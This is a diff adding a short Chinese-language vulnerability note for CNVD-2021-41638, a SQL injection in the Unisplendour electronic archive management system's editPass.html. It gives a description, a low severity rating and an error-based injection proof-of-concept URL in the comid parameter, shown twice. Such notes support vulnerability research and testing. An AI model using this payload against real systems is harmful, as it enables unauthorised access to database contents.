@@ -1,0 +1,26 @@
+# 紫光档案管理系统 editPass.html SQL注入漏洞 CNVD-2021-41638
+
+## 漏洞描述
+紫光软件系统有限公司（以下简称“紫光软件”）是中国领先的行业解决方案和IT服务提供商。 紫光电子档案管理系统存在SQL注入漏洞。攻击者可利用漏洞获取数据库敏感信息。
+
+## 危害等级
+LOW
+
+## 参考链接
+
+## 漏洞复现方法
+登录页面
+
+![image-20220525145742607](images/202205251457947.png)
+
+验证POC
+
+```
+/login/Login/editPass.html?comid=extractvalue(1,concat(char(126),md5(1)))
+```
+
+
+## Payloads
+```
+/login/Login/editPass.html?comid=extractvalue(1,concat(char(126),md5(1)))
+```
